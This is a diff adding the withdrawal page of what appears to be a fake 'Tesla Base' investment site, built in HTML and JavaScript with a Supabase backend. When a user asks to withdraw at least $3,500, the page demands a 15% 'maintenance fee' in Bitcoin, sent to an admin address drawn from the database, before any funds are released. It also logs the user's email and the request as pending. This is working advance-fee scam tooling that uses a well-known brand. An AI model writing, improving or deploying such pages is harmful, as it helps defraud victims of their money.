@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Tesla Base | Secure Withdrawal</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body style="background: #000; color: #fff; padding: 25px; font-family: sans-serif;">
+    <h2 style="color: #e31937;">Withdraw Funds</h2>
+    
+    <div style="background: #111; padding: 20px; border-radius: 12px; border: 1px solid #222;">
+        <label>Select Payment Method</label>
+        <select id="method" style="width: 100%; padding: 12px; background: #000; color: #fff; border: 1px solid #333; margin: 10px 0;">
+            <option value="BTC">Bitcoin (BTC) Wallet</option>
+            <option value="Bank">International Bank Transfer</option>
+            <option value="Wire">Swift/Wire Transfer</option>
+        </select>
+
+        <input type="text" id="wallet-bank-info" placeholder="Enter Wallet Address or Bank Details" style="width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: white; margin-bottom: 15px; box-sizing: border-box;">
+        
+        <input type="number" id="withdraw-amount" placeholder="Amount (Min $3,500)" style="width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: white; margin-bottom: 20px; box-sizing: border-box;">
+
+        <button onclick="checkWithdrawal()" style="width: 100%; background: #fff; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px;">Initiate Withdrawal</button>
+    </div>
+
+    <div id="fee-modal" style="display:none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000;">
+        <div style="background:#111; padding:30px; border: 1px solid #e31937; border-radius: 15px; width: 320px; text-align: center;">
+            <h3 style="color:#e31937;">Maintenance Fee Required</h3>
+            <p>To release your funds, a **15% maintenance fee** of $<span id="calc-fee">0</span> must be paid.</p>
+            <p style="font-size: 12px; color: #666;">Deposit fee to the BTC address below:</p>
+            <div id="admin-btc" style="background:#000; padding:10px; border:1px dashed #444; word-break: break-all; font-family: monospace; font-size: 13px; margin: 15px 0;">
+                </div>
+            <button onclick="document.getElementById('fee-modal').style.display='none'" style="background:#e31937; color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">I have paid</button>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+    <script>
+        async function checkWithdrawal() {
+            const amt = parseFloat(document.getElementById('withdraw-amount').value);
+            if (amt < 3500) return alert("Minimum withdrawal is $3,500");
+
+            // Calculate 15% fee
+            const fee = amt * 0.15;
+            document.getElementById('calc-fee').innerText = fee.toLocaleString();
+            
+            // Fetch Admin BTC Address
+            const { data } = await _supabase.from('settings').select('btc_address').single();
+            document.getElementById('admin-btc').innerText = data.btc_address;
+
+            // Show Modal
+            document.getElementById('fee-modal').style.display = 'flex';
+
+            // Record Pending Withdrawal in History for Admin
+            const { data: { user } } = await _supabase.auth.getUser();
+            await _supabase.from('history').insert([{
+                user_id: user.id,
+                email: user.email,
+                type: 'Withdrawal Request',
+                amount: amt,
+                status: 'Pending'
+            }]);
+        }
+    </script>
+</body>
+</html>
